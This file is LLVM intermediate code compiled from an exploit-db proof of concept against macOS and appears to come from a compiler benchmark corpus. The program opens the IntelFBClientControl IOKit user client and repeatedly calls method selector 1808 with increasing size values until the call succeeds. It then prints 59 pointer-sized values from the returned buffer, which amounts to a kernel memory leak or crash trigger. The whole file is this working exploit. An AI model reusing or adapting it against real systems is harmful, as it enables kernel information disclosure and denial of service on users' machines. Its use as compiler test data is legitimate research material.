; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/macos/dos/extr_41798.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/macos/dos/extr_41798.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@kIOMasterPortDefault = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [21 x i8] c"IntelFBClientControl\00", align 1
@IO_OBJECT_NULL = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [24 x i8] c"unable to find service\0A\00", align 1
@MACH_PORT_NULL = common dso_local global i32 0, align 4
@KERN_SUCCESS = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [38 x i8] c"unable to get user client connection\0A\00", align 1
@.str.3 = private unnamed_addr constant [25 x i8] c"retrying 0x2000 up - %s\0A\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"%016llx\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca [16 x i8*], align 16
  %10 = alloca i8*, align 8
  %11 = alloca [4096 x i8], align 16
  %12 = alloca i64, align 8
  %13 = alloca [16 x i8*], align 16
  %14 = alloca i32, align 4
  %15 = alloca [4096 x i8], align 16
  %16 = alloca i64, align 8
  %17 = alloca i32, align 4
  %18 = alloca i8**, align 8
  %19 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %20 = load i32, i32* @kIOMasterPortDefault, align 4
  %21 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i64 0, i64 0))
  %22 = call i64 @IOServiceGetMatchingService(i32 %20, i32 %21)
  store i64 %22, i64* %7, align 8
  %23 = load i64, i64* %7, align 8
  %24 = load i64, i64* @IO_OBJECT_NULL, align 8
  %25 = icmp eq i64 %23, %24
  br i1 %25, label %26, label %28

26:                                               ; preds = %2
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %91

28:                                               ; preds = %2
  %29 = load i32, i32* @MACH_PORT_NULL, align 4
  store i32 %29, i32* %8, align 4
  %30 = load i64, i64* %7, align 8
  %31 = call i32 (...) @mach_task_self()
  %32 = call i64 @IOServiceOpen(i64 %30, i32 %31, i32 0, i32* %8)
  store i64 %32, i64* %6, align 8
  %33 = load i64, i64* %6, align 8
  %34 = load i64, i64* @KERN_SUCCESS, align 8
  %35 = icmp ne i64 %33, %34
  br i1 %35, label %36, label %38

36:                                               ; preds = %28
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %91

38:                                               ; preds = %28
  store i8* null, i8** %10, align 8
  store i64 4096, i64* %12, align 8
  store i32 0, i32* %14, align 4
  store i64 472, i64* %16, align 8
  store i32 1, i32* %17, align 4
  br label %39

39:                                               ; preds = %70, %38
  %40 = load i32, i32* %17, align 4
  %41 = icmp slt i32 %40, 1000
  br i1 %41, label %42, label %73

42:                                               ; preds = %39
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %44 = load i64, i64* %12, align 8
  %45 = call i32 @memset(i8* %43, i32 0, i64 %44)
  %46 = load i32, i32* %17, align 4
  %47 = mul nsw i32 %46, 1024
  %48 = add nsw i32 568, %47
  %49 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %50 = bitcast i8* %49 to i32*
  store i32 %48, i32* %50, align 16
  store i64 4096, i64* %16, align 8
  %51 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i64 0, i64 0
  %52 = load i64, i64* %16, align 8
  %53 = call i32 @memset(i8* %51, i32 0, i64 %52)
  %54 = load i32, i32* %8, align 4
  %55 = getelementptr inbounds [16 x i8*], [16 x i8*]* %9, i64 0, i64 0
  %56 = load i8*, i8** %10, align 8
  %57 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %58 = load i64, i64* %12, align 8
  %59 = getelementptr inbounds [16 x i8*], [16 x i8*]* %13, i64 0, i64 0
  %60 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i64 0, i64 0
  %61 = call i64 @IOConnectCallMethod(i32 %54, i32 1808, i8** %55, i8* %56, i8* %57, i64 %58, i8** %59, i32* %14, i8* %60, i64* %16)
  store i64 %61, i64* %6, align 8
  %62 = load i64, i64* %6, align 8
  %63 = load i64, i64* @KERN_SUCCESS, align 8
  %64 = icmp eq i64 %62, %63
  br i1 %64, label %65, label %66

65:                                               ; preds = %42
  br label %73

66:                                               ; preds = %42
  %67 = load i64, i64* %6, align 8
  %68 = call i8* @mach_error_string(i64 %67)
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3, i64 0, i64 0), i8* %68)
  br label %70

70:                                               ; preds = %66
  %71 = load i32, i32* %17, align 4
  %72 = add nsw i32 %71, 1
  store i32 %72, i32* %17, align 4
  br label %39

73:                                               ; preds = %65, %39
  %74 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i64 0, i64 0
  %75 = getelementptr inbounds i8, i8* %74, i64 3
  %76 = bitcast i8* %75 to i8**
  store i8** %76, i8*** %18, align 8
  store i32 0, i32* %19, align 4
  br label %77

77:                                               ; preds = %87, %73
  %78 = load i32, i32* %19, align 4
  %79 = icmp slt i32 %78, 59
  br i1 %79, label %80, label %90

80:                                               ; preds = %77
  %81 = load i8**, i8*** %18, align 8
  %82 = load i32, i32* %19, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8*, i8** %81, i64 %83
  %85 = load i8*, i8** %84, align 8
  %86 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i8* %85)
  br label %87

87:                                               ; preds = %80
  %88 = load i32, i32* %19, align 4
  %89 = add nsw i32 %88, 1
  store i32 %89, i32* %19, align 4
  br label %77

90:                                               ; preds = %77
  store i32 0, i32* %3, align 4
  br label %91

91:                                               ; preds = %90, %36, %26
  %92 = load i32, i32* %3, align 4
  ret i32 %92
}

declare dso_local i64 @IOServiceGetMatchingService(i32, i32) #1

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @IOServiceOpen(i64, i32, i32, i32*) #1

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i32 @memset(i8*, i32, i64) #1

declare dso_local i64 @IOConnectCallMethod(i32, i32, i8**, i8*, i8*, i64, i8**, i32*, i8*, i64*) #1

declare dso_local i8* @mach_error_string(i64) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
